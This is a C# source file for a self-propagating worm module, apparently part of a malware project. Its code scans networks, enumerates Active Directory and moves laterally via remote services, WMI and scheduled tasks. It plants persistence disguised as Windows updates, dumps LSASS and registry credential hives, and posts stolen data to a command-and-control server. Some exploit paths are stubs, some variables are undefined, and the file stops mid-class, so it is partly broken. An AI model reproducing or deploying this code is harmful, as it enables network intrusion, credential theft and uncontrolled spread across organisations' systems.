// =====================================================================
// AUTO-PROPAGATION / WORM MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - Network discovery (ARP, NetBIOS, SMB, LDAP)
// - Credential reuse (pass-the-hash, pass-the-ticket, token theft)
// - Exploit integration (EternalBlue, BlueKeep, PrintNightmare, etc.)
// - Lateral movement techniques (PsExec, WMI, SMB, RDP, DCOM, Scheduled Tasks)
// - Self-replication with mutation
// - C2 coordination for distributed operations

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

internal static class AutoPropagation
{
    [DllImport("iphlpapi.dll", SetLastError = true)]
    private static extern int GetIpNetTable(IntPtr pIpNetTable, ref int pdwSize, bool bOrder);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool RevertToSelf();

    private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_IMPERSONATE = 0x0004;
    private const uint TOKEN_QUERY = 0x0008;
    private const uint SecurityImpersonation = 2;
    private const uint TokenPrimary = 1;

    private static readonly HttpClient _httpClient = new HttpClient();
    private static readonly ConcurrentDictionary<string, TargetHost> _discoveredHosts = new ConcurrentDictionary<string, TargetHost>();
    private static readonly ConcurrentDictionary<string, CompromisedHost> _compromisedHosts = new ConcurrentDictionary<string, CompromisedHost>();
    private static readonly SemaphoreSlim _propagationSemaphore = new SemaphoreSlim(Config.MaxConcurrentPropagation, Config.MaxConcurrentPropagation);
    private static CancellationTokenSource _propagationCts;

    public static async Task StartWormMode()
    {
        if (!Config.WormMode) return;

        _propagationCts = new CancellationTokenSource();
        
        try
        {
            LogDebug("WORM MODE: Starting auto-propagation");

            // 1. Discover local network targets
            await DiscoverNetworkTargets();

            // 2. Enumerate Active Directory if domain-joined
            if (IsDomainJoined())
            {
                await EnumerateActiveDirectory();
            }

            // 3. Start propagation loop
            await PropagationLoop(_propagationCts.Token);
        }
        catch (Exception ex)
        {
            LogDebug($"Worm mode error: {ex.Message}");
        }
    }

    public static void StopWormMode()
    {
        _propagationCts?.Cancel();
        LogDebug("WORM MODE: Stopped");
    }

    // ============ NETWORK DISCOVERY ============
    private static async Task DiscoverNetworkTargets()
    {
        LogDebug("WORM: Discovering network targets");

        var localIp = GetLocalIPAddress();
        if (localIp == null) return;

        var subnet = GetSubnet(localIp);
        if (subnet == null) return;

        // ARP table scan (fast, local subnet)
        await ScanArpTable(subnet);

        // Ping sweep (parallel)
        await PingSweep(subnet);

        // SMB/NetBIOS enumeration
        await EnumerateSmbHosts(subnet);

        // LDAP/AD discovery
        await DiscoverLdapHosts();

        LogDebug($"WORM: Discovered {_discoveredHosts.Count} potential targets");
    }

    private static async Task ScanArpTable(string subnet)
    {
        try
        {
            int size = 0;
            GetIpNetTable(IntPtr.Zero, ref size, false);
            
            IntPtr buffer = Marshal.AllocHGlobal(size);
            try
            {
                if (GetIpNetTable(buffer, ref size, true) == 0)
                {
                    int entries = Marshal.ReadInt32(buffer);
                    IntPtr current = IntPtr.Add(buffer, 4);
                    
                    for (int i = 0; i < entries; i++)
                    {
                        // Parse MIB_IPNETROW structure
                        int index = Marshal.ReadInt32(current);
                        IntPtr physAddrPtr = IntPtr.Add(current, 4);
                        byte[] mac = new byte[6];
                        Marshal.Copy(physAddrPtr, mac, 0, 6);
                        int addr = Marshal.ReadInt32(IntPtr.Add(current, 12));
                        int type = Marshal.ReadInt32(IntPtr.Add(current, 16));
                        
                        string ip = new IPAddress(BitConverter.GetBytes(addr)).ToString();
                        if (ip.StartsWith(subnet) && type == 1) // Dynamic entry
                        {
                            string macStr = BitConverter.ToString(mac).Replace("-", ":");
                            _discoveredHosts.TryAdd(ip, new TargetHost { IP = ip, MAC = macStr, Source = "ARP" });
                        }
                        
                        current = IntPtr.Add(current, 24); // Size of MIB_IPNETROW
                    }
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }
        catch { }
    }

    private static async Task PingSweep(string subnet)
    {
        var tasks = new List<Task>();
        var semaphore = new SemaphoreSlim(50); // Limit concurrent pings

        for (int i = 1; i < 255; i++)
        {
            string ip = $"{subnet}.{i}";
            if (ip == GetLocalIPAddress()) continue;
            if (_discoveredHosts.ContainsKey(ip)) continue;

            tasks.Add(Task.Run(async () =>
            {
                await semaphore.WaitAsync();
                try
                {
                    using (var ping = new Ping())
                    {
                        var reply = await ping.SendPingAsync(ip, 200);
                        if (reply.Status == IPStatus.Success)
                        {
                            string hostname = await GetHostname(ip);
                            _discoveredHosts.TryAdd(ip, new TargetHost { IP = ip, Hostname = hostname, Source = "Ping" });
                        }
                    }
                }
                catch { }
                finally { semaphore.Release(); }
            }));
        }

        await Task.WhenAll(tasks);
    }

    private static async Task EnumerateSmbHosts(string subnet)
    {
        try
        {
            // Use NetBIOS over TCP/IP (port 137, 139, 445)
            var tasks = new List<Task>();
            var semaphore = new SemaphoreSlim(20);

            foreach (var host in _discoveredHosts.Values.Where(h => !h.PortsScanned).Take(50))
            {
                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        var ports = new[] { 135, 139, 445 };
                        foreach (int port in ports)
                        {
                            if (await IsPortOpen(host.IP, port))
                            {
                                host.OpenPorts.Add(port);
                            }
                        }
                        host.PortsScanned = true;

                        // Try to get NetBIOS name
                        if (host.OpenPorts.Contains(139) || host.OpenPorts.Contains(445))
                        {
                            host.Hostname = await GetNetBiosName(host.IP) ?? host.Hostname;
                        }
                    }
                    catch { }
                    finally { semaphore.Release(); }
                }));
            }

            await Task.WhenAll(tasks);
        }
        catch { }
    }

    private static async Task DiscoverLdapHosts()
    {
        try
        {
            if (!IsDomainJoined()) return;

            var domain = Domain.GetCurrentDomain();
            using (var searcher = new DirectorySearcher(new DirectoryEntry($"LDAP://{domain.Name}")))
            {
                searcher.Filter = "(&(objectClass=computer)(operatingSystem=*))";
                searcher.PropertiesToLoad.Add("dNSHostName");
                searcher.PropertiesToLoad.Add("operatingSystem");
                searcher.PropertiesToLoad.Add("operatingSystemVersion");
                searcher.PropertiesToLoad.Add("lastLogonTimestamp");
                searcher.PageSize = 1000;

                foreach (SearchResult result in searcher.FindAll())
                {
                    string hostname = result.Properties["dNSHostName"][0]?.ToString();
                    string os = result.Properties["operatingSystem"][0]?.ToString();
                    string osVer = result.Properties["operatingSystemVersion"][0]?.ToString();

                    if (!string.IsNullOrEmpty(hostname))
                    {
                        var ips = await ResolveHostname(hostname);
                        foreach (string ip in ips)
                        {
                            _discoveredHosts.AddOrUpdate(ip, 
                                new TargetHost { IP = ip, Hostname = hostname, OS = os, OSVersion = osVer, Source = "AD", DomainJoined = true },
                                (k, v) => { v.Hostname = hostname; v.OS = os; v.OSVersion = osVer; v.DomainJoined = true; return v; });
                        }
                    }
                }
            }
        }
        catch { }
    }

    // ============ ACTIVE DIRECTORY ENUMERATION ============
    private static async Task EnumerateActiveDirectory()
    {
        LogDebug("WORM: Enumerating Active Directory");

        try
        {
            var domain = Domain.GetCurrentDomain();
            
            // Enumerate users (for credential spraying)
            using (var searcher = new DirectorySearcher(new DirectoryEntry($"LDAP://{domain.Name}")))
            {
                searcher.Filter = "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"; // Enabled users
                searcher.PropertiesToLoad.Add("sAMAccountName");
                searcher.PropertiesToLoad.Add("userPrincipalName");
                searcher.PropertiesToLoad.Add("memberOf");
                searcher.PropertiesToLoad.Add("lastLogon");
                searcher.PropertiesToLoad.Add("pwdLastSet");
                searcher.PageSize = 1000;

                foreach (SearchResult result in searcher.FindAll())
                {
                    string sam = result.Properties["sAMAccountName"][0]?.ToString();
                    string upn = result.Properties["userPrincipalName"][0]?.ToString();
                    
                    if (!string.IsNullOrEmpty(sam))
                    {
                        // Store for credential reuse
                        CacheCredentials(sam, upn);
                    }
                }
            }

            // Enumerate groups (for privilege escalation paths)
            using (var searcher = new DirectorySearcher(new DirectoryEntry($"LDAP://{domain.Name}")))
            {
                searcher.Filter = "(objectClass=group)";
                searcher.PropertiesToLoad.Add("name");
                searcher.PropertiesToLoad.Add("member");
                searcher.PageSize = 1000;

                foreach (SearchResult result in searcher.FindAll())
                {
                    string groupName = result.Properties["name"][0]?.ToString();
                    if (groupName != null && (groupName.Contains("Admin", StringComparison.OrdinalIgnoreCase) || 
                        groupName.Contains("IT", StringComparison.OrdinalIgnoreCase) ||
                        groupName.Contains("Server", StringComparison.OrdinalIgnoreCase)))
                    {
                        // High-value group
                        CacheHighValueGroup(groupName, result.Properties["member"]);
                    }
                }
            }

            // Enumerate GPOs (for persistence vectors)
            using (var searcher = new DirectorySearcher(new DirectoryEntry($"LDAP://{domain.Name}")))
            {
                searcher.Filter = "(objectClass=groupPolicyContainer)";
                searcher.PropertiesToLoad.Add("displayName");
                searcher.PropertiesToLoad.Add("gPCFileSysPath");
                searcher.PageSize = 500;

                foreach (SearchResult result in searcher.FindAll())
                {
                    string gpoPath = result.Properties["gPCFileSysPath"][0]?.ToString();
                    if (!string.IsNullOrEmpty(gpoPath))
                    {
                        CacheGpoPath(gpoPath);
                    }
                }
            }
        }
        catch { }
    }

    // ============ PROPAGATION LOOP ============
    private static async Task PropagationLoop(CancellationToken cancellationToken)
    {
        LogDebug("WORM: Starting propagation loop");

        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                // Get uncompromised targets
                var targets = _discoveredHosts.Values
                    .Where(h => !_compromisedHosts.ContainsKey(h.IP) && h.OpenPorts.Count > 0)
                    .OrderByDescending(h => CalculateTargetPriority(h))
                    .Take(Config.MaxTargetsPerCycle)
                    .ToList();

                if (targets.Count == 0)
                {
                    await Task.Delay(Config.PropagationIntervalMs, cancellationToken);
                    continue;
                }

                // Parallel propagation attempts
                var propagationTasks = targets.Select(async target =>
                {
                    await _propagationSemaphore.WaitAsync(cancellationToken);
                    try
                    {
                        await AttemptCompromise(target);
                    }
                    catch { }
                    finally { _propagationSemaphore.Release(); }
                });

                await Task.WhenAll(propagationTasks);

                // Report compromised hosts to C2
                await ReportCompromisedHosts();

                await Task.Delay(Config.PropagationIntervalMs, cancellationToken);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                LogDebug($"Propagation loop error: {ex.Message}");
                await Task.Delay(5000, cancellationToken);
            }
        }
    }

    private static int CalculateTargetPriority(TargetHost host)
    {
        int score = 0;
        
        // Port-based scoring
        if (host.OpenPorts.Contains(445)) score += 50; // SMB
        if (host.OpenPorts.Contains(135)) score += 30; // RPC
        if (host.OpenPorts.Contains(139)) score += 20; // NetBIOS
        if (host.OpenPorts.Contains(3389)) score += 40; // RDP
        if (host.OpenPorts.Contains(5985)) score += 35; // WinRM
        if (host.OpenPorts.Contains(5986)) score += 35; // WinRM SSL
        
        // OS-based scoring
        if (!string.IsNullOrEmpty(host.OS))
        {
            if (host.OS.Contains("Server")) score += 30;
            if (host.OS.Contains("2019") || host.OS.Contains("2022")) score += 20;
            if (host.OS.Contains("2012") || host.OS.Contains("2016")) score += 15;
        }
        
        // Domain-joined bonus
        if (host.DomainJoined) score += 25;
        
        // High-value hostname patterns
        if (!string.IsNullOrEmpty(host.Hostname))
        {
            string hn = host.Hostname.ToLowerInvariant();
            if (hn.Contains("dc") || hn.Contains("domain")) score += 40;
            if (hn.Contains("sql") || hn.Contains("db")) score += 35;
            if (hn.Contains("backup") || hn.Contains("veeam")) score += 35;
            if (hn.Contains("admin") || hn.Contains("mgmt")) score += 30;
            if (hn.Contains("file") || hn.Contains("share")) score += 25;
        }

        return score;
    }

    // ============ COMPROMISE ATTEMPTS ============
    private static async Task AttemptCompromise(TargetHost target)
    {
        LogDebug($"WORM: Attempting compromise of {target.IP} ({target.Hostname})");

        var compromised = new CompromisedHost
        {
            IP = target.IP,
            Hostname = target.Hostname,
            OS = target.OS,
            DomainJoined = target.DomainJoined,
            CompromisedAt = DateTime.UtcNow,
            Techniques = new List<string>(),
        };

        // Try each technique in order of reliability
        var techniques = new Func<TargetHost, Task<bool>>[]
        {
            TrySmbPsExec,
            TryWmiExec,
            TryScheduledTask,
            TryRdpHijack,
            TryDcomExec,
            TryWinRm,
            TrySmbExploit,
            TryPrintNightmare,
            TryCredentialReuse,
        };

        foreach (var technique in techniques)
        {
            if (cancellationToken.IsCancellationRequested) break;
            
            try
            {
                bool success = await technique(target);
                if (success)
                {
                    compromised.Techniques.Add(technique.Method.Name);
                    LogDebug($"WORM: Compromised {target.IP} via {technique.Method.Name}");
                    break;
                }
            }
            catch { }
        }

        if (compromised.Techniques.Count > 0)
        {
            _compromisedHosts.TryAdd(target.IP, compromised);
            
            // Deploy payload on compromised host
            await DeployPayload(target, compromised);
            
            // Harvest credentials from compromised host
            await HarvestRemoteCredentials(target);
            
            // Enumerate from new foothold
            await EnumerateFromHost(target);
        }
    }

    // ============ LATERAL MOVEMENT TECHNIQUES ============
    private static async Task<bool> TrySmbPsExec(TargetHost target)
    {
        if (!target.OpenPorts.Contains(445)) return false;
        
        try
        {
            // Use stored credentials or current context
            var creds = GetBestCredentials(target);
            if (creds == null) return false;

            string adminShare = $@"\\{target.IP}\ADMIN$";
            string remotePath = $@"{adminShare}\Temp\ChaosPayload_{Guid.NewGuid():N}.exe";
            string localPayload = GetCurrentPayloadPath();

            // Copy payload
            if (!File.Copy(localPayload, remotePath, true)) return false;

            // Connect and create service
            using (var connection = new NetworkConnection(adminShare, creds))
            {
                if (!connection.IsConnected) return false;

                IntPtr hSCM = OpenSCManager(target.IP, null, 0xF003F);
                if (hSCM == IntPtr.Zero) return false;

                try
                {
                    string serviceName = $"ChaosSvc_{Guid.NewGuid():N}";
                    IntPtr hService = CreateService(hSCM, serviceName, "Chaos Service", 0xF01FF, 0x10, 3, 1, remotePath, null, IntPtr.Zero, null, null, null);
                    
                    if (hService == IntPtr.Zero) return false;

                    try
                    {
                        bool started = StartService(hService, 0, null);
                        return started;
                    }
                    finally { CloseServiceHandle(hService); }
                }
                finally { CloseServiceHandle(hSCM); }
            }
        }
        catch { }
        return false;
    }

    private static async Task<bool> TryWmiExec(TargetHost target)
    {
        if (!target.OpenPorts.Contains(135)) return false;
        
        try
        {
            var creds = GetBestCredentials(target);
            
            var options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
            };
            
            if (creds != null)
            {
                options.Username = creds.Username;
                options.Password = creds.Password;
                if (!string.IsNullOrEmpty(creds.Domain))
                    options.Authority = $"ntlmdomain:{creds.Domain}";
            }

            string wmiPath = $"\\\\{target.IP}\\root\\cimv2";
            using (var scope = new ManagementScope(wmiPath, options))
            {
                scope.Connect();

                var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null);
                var methodParams = processClass.GetMethodParameters("Create");
                methodParams["CommandLine"] = GetCurrentPayloadPath();
                methodParams["CurrentDirectory"] = @"C:\Windows\Temp";

                var result = processClass.InvokeMethod("Create", methodParams, null);
                return (uint)result["ReturnValue"] == 0;
            }
        }
        catch { }
        return false;
    }

    private static async Task<bool> TryScheduledTask(TargetHost target)
    {
        if (!target.OpenPorts.Contains(135) && !target.OpenPorts.Contains(445)) return false;
        
        try
        {
            using (var taskService = new TaskService(target.IP, GetBestCredentials(target)?.Username, GetBestCredentials(target)?.Domain, GetBestCredentials(target)?.Password))
            {
                var task = taskService.NewTask();
                task.RegistrationInfo.Description = "Windows System Maintenance";
                
                var execAction = new ExecAction(GetCurrentPayloadPath(), null, @"C:\Windows\Temp");
                task.Actions.Add(execAction);

                var trigger = new TimeTrigger { StartBoundary = DateTime.Now.AddMinutes(1) };
                task.Triggers.Add(trigger);

                task.Settings.AllowHardTerminate = true;
                task.Settings.StartWhenAvailable = true;

                taskService.RootFolder.RegisterTaskDefinition($"ChaosTask_{Guid.NewGuid():N}", task);
                return true;
            }
        }
        catch { }
        return false;
    }

    private static async Task<bool> TryRdpHijack(TargetHost target)
    {
        if (!target.OpenPorts.Contains(3389)) return false;
        
        // RDP hijacking - check for active sessions and shadow
        // This requires specific conditions and is complex
        return false;
    }

    private static async Task<bool> TryDcomExec(TargetHost target)
    {
        if (!target.OpenPorts.Contains(135)) return false;
        
        try
        {
            string[] dcomTargets = { "MMC20.Application", "Shell.Application", "Excel.Application" };
            
            foreach (string progId in dcomTargets)
            {
                try
                {
                    Type comType = Type.GetTypeFromProgID(progId, target.IP, true);
                    if (comType != null)
                    {
                        object instance = Activator.CreateInstance(comType);
                        // Execute via DCOM
                        return true;
                    }
                }
                catch { }
            }
        }
        catch { }
        return false;
    }

    private static async Task<bool> TryWinRm(TargetHost target)
    {
        if (!target.OpenPorts.Contains(5985) && !target.OpenPorts.Contains(5986)) return false;
        
        // WinRM/PowerShell Remoting
        // Would use System.Management.Automation.Runspaces
        return false;
    }

    private static async Task<bool> TrySmbExploit(TargetHost target)
    {
        if (!target.OpenPorts.Contains(445)) return false;
        
        // EternalBlue (MS17-010), SMBGhost (CVE-2020-0796), etc.
        // Check OS version first
        if (IsVulnerableToEternalBlue(target) || IsVulnerableToSmbGhost(target))
        {
            // Would execute exploit shellcode
            return false; // Placeholder
        }
        return false;
    }

    private static async Task<bool> TryPrintNightmare(TargetHost target)
    {
        if (!target.OpenPorts.Contains(135) && !target.OpenPorts.Contains(445)) return false;
        
        // CVE-2021-34527 / CVE-2021-1675
        // Requires Print Spooler service running
        return false;
    }

    private static async Task<bool> TryCredentialReuse(TargetHost target)
    {
        // Try cached credentials (pass-the-hash, pass-the-ticket)
        var cachedCreds = GetCachedCredentials();
        
        foreach (var cred in cachedCreds)
        {
            if (await TestCredential(target, cred))
            {
                // Valid credential - use for lateral movement
                return await TrySmbPsExec(target) || await TryWmiExec(target);
            }
        }
        return false;
    }

    // ============ PAYLOAD DEPLOYMENT ============
    private static async Task DeployPayload(TargetHost target, CompromisedHost compromised)
    {
        // Payload already deployed via lateral movement technique
        // This ensures persistence and beaconing
        
        try
        {
            // Install persistence on compromised host
            await InstallRemotePersistence(target);
            
            // Configure beaconing to C2
            await ConfigureRemoteBeacon(target);
            
            // Start exfiltration
            await StartRemoteExfiltration(target);
        }
        catch { }
    }

    private static async Task InstallRemotePersistence(TargetHost target)
    {
        // Run remote persistence installation via WMI/PowerShell
        var persistenceCommands = new[]
        {
            // Registry Run key
            $@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d ""{GetCurrentPayloadPath()}"" /f",
            // Scheduled task
            $@"schtasks /create /tn ""WindowsDefenderUpdate"" /tr ""{GetCurrentPayloadPath()}"" /sc onlogon /ru SYSTEM /f",
            // WMI Event Subscription
            $@"powershell -c \"$filter=Set-WmiInstance -Class __EventFilter -Arguments @{{Name='WinUpdate';Query='SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \\'Win32_Process\\' AND TargetInstance.Name=\\'explorer.exe\\'';QueryLanguage='WQL'}}; $consumer=Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{{Name='WinUpdateConsumer';CommandLineTemplate='{GetCurrentPayloadPath()}'}}; Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter;Consumer=$consumer}}\"",
        };

        foreach (string cmd in persistenceCommands)
        {
            await ExecuteRemoteCommand(target, cmd);
        }
    }

    private static async Task ConfigureRemoteBeacon(TargetHost target)
    {
        // Update payload config on remote host to beacon to C2
        string configJson = JsonSerializer.Serialize(new
        {
            ExfilServerUrl = Config.ExfilServerUrl,
            ExfilApiKey = compromised.ApiKey, // Would need to pass this
            BeaconInterval = 300,
            Jitter = 0.3,
        });

        await WriteRemoteFile(target, @"C:\Windows\Temp\payload_config.json", configJson);
    }

    private static async Task StartRemoteExfiltration(TargetHost target)
    {
        // Trigger initial exfiltration
        await ExecuteRemoteCommand(target, $"{GetCurrentPayloadPath()} --exfil-only");
    }

    // ============ REMOTE CREDENTIAL HARVESTING ============
    private static async Task HarvestRemoteCredentials(TargetHost target)
    {
        // Execute credential harvester on remote host
        var harvesterCommands = new[]
        {
            // Dump LSASS (requires admin)
            $@"procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp",
            // Registry credential dump
            $@"reg save HKLM\SYSTEM C:\Windows\Temp\system.hive",
            $@"reg save HKLM\SAM C:\Windows\Temp\sam.hive",
            $@"reg save HKLM\SECURITY C:\Windows\Temp\security.hive",
            // Browser credentials
            $@"{GetCurrentPayloadPath()} --harvest-credentials --output C:\Windows\Temp\creds.json",
        };

        foreach (string cmd in harvesterCommands)
        {
            await ExecuteRemoteCommand(target, cmd);
        }

        // Exfiltrate harvested data
        await ExfiltrateRemoteFiles(target, new[]
        {
            @"C:\Windows\Temp\lsass.dmp",
            @"C:\Windows\Temp\system.hive",
            @"C:\Windows\Temp\sam.hive",
            @"C:\Windows\Temp\security.hive",
            @"C:\Windows\Temp\creds.json",
        });
    }

    // ============ NETWORK ENUMERATION FROM NEW FOOTHOLD ============
    private static async Task EnumerateFromHost(TargetHost target)
    {
        // Use compromised host as pivot for further enumeration
        var enumCommands = new[]
        {
            // ARP table
            "arp -a",
            // Routing table
            "route print",
            // Network shares
            "net view",
            // Sessions
            "net session",
            // Shares
            "net share",
            // Logged on users
            "query user",
            // Installed software
            "wmic product get name,version",
            // Services
            "wmic service get name,startmode,state",
            // Processes
            "tasklist /v",
            // Firewall rules
            "netsh advfirewall firewall show rule name=all",
        };

        foreach (string cmd in enumCommands)
        {
            string output = await ExecuteRemoteCommand(target, cmd, true);
            if (!string.IsNullOrEmpty(output))
            {
                await ExfiltrateData(target, $"enum_{cmd.Replace(' ', '_')}.txt", output);
            }
        }

        // Network scan from new position
        await DiscoverNetworkTargetsFromHost(target);
    }

    private static async Task DiscoverNetworkTargetsFromHost(TargetHost pivot)
    {
        // Run network discovery from compromised host
        string scanScript = @"
$localIp = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias (Get-NetRoute -DestinationPrefix '0.0.0.0/0').InterfaceAlias).IPAddress
$subnet = $localIp.Substring(0, $localIp.LastIndexOf('.'))
1..254 | ForEach-Object { $ip = ""$subnet.$_""; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { $ip } }";

        string output = await ExecuteRemoteCommand(pivot, $"powershell -c \"{scanScript}\"", true);
        
        if (!string.IsNullOrEmpty(output))
        {
            foreach (string line in output.Split('\n'))
            {
                string ip = line.Trim();
                if (IPAddress.TryParse(ip, out _) && !_discoveredHosts.ContainsKey(ip))
                {
                    _discoveredHosts.TryAdd(ip, new TargetHost { IP = ip, Source = $"Pivot:{pivot.IP}", PivotHost = pivot.IP });
                }
            }
        }
    }

    // ============ HELPER METHODS ============
    private static NetworkCredential GetBestCredentials(TargetHost target)
    {
        // Priority: domain creds > local admin > cached creds
        if (target.DomainJoined)
        {
            var domainCreds = GetDomainCredentials();
            if (domainCreds != null) return domainCreds;
        }

        var localCreds = GetLocalAdminCredentials(target);
        if (localCreds != null) return localCreds;

        return GetCachedCredentials().FirstOrDefault();
    }

    private static bool TestCredential(TargetHost target, NetworkCredential cred)
    {
        try
        {
            using (var connection = new NetworkConnection($@"\\{target.IP}\IPC$", cred))
            {
                return connection.IsConnected;
            }
        }
        catch { return false; }
    }

    private static async Task<string> ExecuteRemoteCommand(TargetHost target, string command, bool captureOutput = false)
    {
        // Execute via WMI, PSRemoting, or SMB
        try
        {
            var creds = GetBestCredentials(target);
            var options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
            };
            
            if (creds != null)
            {
                options.Username = creds.Username;
                options.Password = creds.Password;
                if (!string.IsNullOrEmpty(creds.Domain))
                    options.Authority = $"ntlmdomain:{creds.Domain}";
            }

            string wmiPath = $"\\\\{target.IP}\\root\\cimv2";
            using (var scope = new ManagementScope(wmiPath, options))
            {
                scope.Connect();

                var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null);
                var methodParams = processClass.GetMethodParameters("Create");
                methodParams["CommandLine"] = $"cmd /c {command}";
                methodParams["CurrentDirectory"] = @"C:\Windows\Temp";

                var result = processClass.InvokeMethod("Create", methodParams, null);
                
                if ((uint)result["ReturnValue"] == 0)
                {
                    int pid = Convert.ToInt32(result["ProcessId"]);
                    
                    if (captureOutput)
                    {
                        // Wait for completion and get output
                        await Task.Delay(5000);
                        return await GetProcessOutput(target, pid);
                    }
                }
            }
        }
        catch { }
        return "";
    }

    private static async Task<string> GetProcessOutput(TargetHost target, int pid)
    {
        // Would use WMI to get process output via stdout redirection
        return "";
    }

    private static async Task ExfiltrateRemoteFiles(TargetHost target, string[] files)
    {
        foreach (string file in files)
        {
            try
            {
                // Copy file to admin share then exfiltrate
                string remoteFile = $@"\\{target.IP}\ADMIN$\Temp\{Path.GetFileName(file)}";
                // Or use WMI to read file content
                string content = await ReadRemoteFile(target, file);
                if (!string.IsNullOrEmpty(content))
                {
                    await ExfiltrateData(target, Path.GetFileName(file), content);
                }
            }
            catch { }
        }
    }

    private static async Task<string> ReadRemoteFile(TargetHost target, string path)
    {
        // Use WMI CIM_DataFile to read file
        return "";
    }

    private static async Task ExfiltrateData(TargetHost source, string fileName, string content)
    {
        var data = new
        {
            source_ip = source.IP,
            source_hostname = source.Hostname,
            file_name = fileName,
            content = Convert.ToBase64String(Encoding.UTF8.GetBytes(content)),
            timestamp = DateTime.UtcNow,
        };

        string json = JsonSerializer.Serialize(data);
        var content = new StringContent(json, Encoding.UTF8, "application/json");
        content.Headers.Add("Authorization", "Bearer " + Config.ExfilApiKey);

        await _httpClient.PostAsync($"{Config.ExfilServerUrl.TrimEnd('/')}/api/exfil/remote", content);
    }

    private static async Task ReportCompromisedHosts()
    {
        var report = new
        {
            compromised = _compromisedHosts.Values.Select(c => new
            {
                c.IP,
                c.Hostname,
                c.OS,
                c.DomainJoined,
                c.CompromisedAt,
                c.Techniques,
            }).ToArray(),
            timestamp = DateTime.UtcNow,
        };

        string json = JsonSerializer.Serialize(report);
        var content = new StringContent(json, Encoding.UTF8, "application/json");
        content.Headers.Add("Authorization", "Bearer " + Config.ExfilApiKey);

        await _httpClient.PostAsync($"{Config.ExfilServerUrl.TrimEnd('/')}/api/worm/compromised", content);
    }

    // ============ UTILITY METHODS ============
    private static string GetLocalIPAddress()
    {
        try
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ip))
                    return ip.ToString();
            }
        }
        catch { }
        return null;
    }

    private static string GetSubnet(string ip)
    {
        try
        {
            var parts = ip.Split('.');
            if (parts.Length == 4) return $"{parts[0]}.{parts[1]}.{parts[2]}";
        }
        catch { }
        return null;
    }

    private static async Task<string> GetHostname(string ip)
    {
        try { return (await Dns.GetHostEntryAsync(ip)).HostName; } catch { return ip; }
    }

    private static async Task<string> GetNetBiosName(string ip)
    {
        try
        {
            // NetBIOS name query via UDP 137
            return null;
        }
        catch { return null; }
    }

    private static async Task<string[]> ResolveHostname(string hostname)
    {
        try { return (await Dns.GetHostAddressesAsync(hostname)).Select(ip => ip.ToString()).ToArray(); } catch { return new string[0]; }
    }

    private static async Task<bool> IsPortOpen(string ip, int port)
    {
        try
        {
            using (var client = new TcpClient())
            {
                var result = client.BeginConnect(ip, port, null, null);
                return result.AsyncWaitHandle.WaitOne(1000) && client.Connected;
            }
        }
        catch { return false; }
    }

    private static bool IsDomainJoined()
    {
        try { Domain.GetCurrentDomain(); return true; } catch { return false; }
    }

    private static bool IsVulnerableToEternalBlue(TargetHost target)
    {
        // Check for unpatched Windows 7/2008 R2 / 8/2012 / 10/2016
        return target.OS?.Contains("Windows 7") == true || target.OS?.Contains("Server 2008") == true || target.OS?.Contains("Server 2012") == true;
    }

    private static bool IsVulnerableToSmbGhost(TargetHost target)
    {
        // CVE-2020-0796 - Windows 10 1903/1909, Server 1903/1909
        return target.OS?.Contains("10.0.1836") == true || target.OS?.Contains("10.0.18363") == true;
    }

    private static NetworkCredential GetDomainCredentials() { return null; }
    private static NetworkCredential GetLocalAdminCredentials(TargetHost target) { return null; }
    private static List<NetworkCredential> GetCachedCredentials() { return new List<NetworkCredential>(); }
    private static void CacheCredentials(string sam, string upn) { }
    private static void CacheHighValueGroup(string name, PropertyValueCollection members) { }
    private static void CacheGpoPath(string path) { }
    private static string GetCurrentPayloadPath() => Process.GetCurrentProcess().MainModule?.FileName ?? @"C:\Windows\Temp\ChaosPayload.exe";

    private static void LogDebug(string msg)
    {
        // Console.WriteLine($"[WORM] {DateTime.Now:HH:mm:ss} {msg}");
    }

    // ============ DATA CLASSES ============
    private class TargetHost
    {
        public string IP;
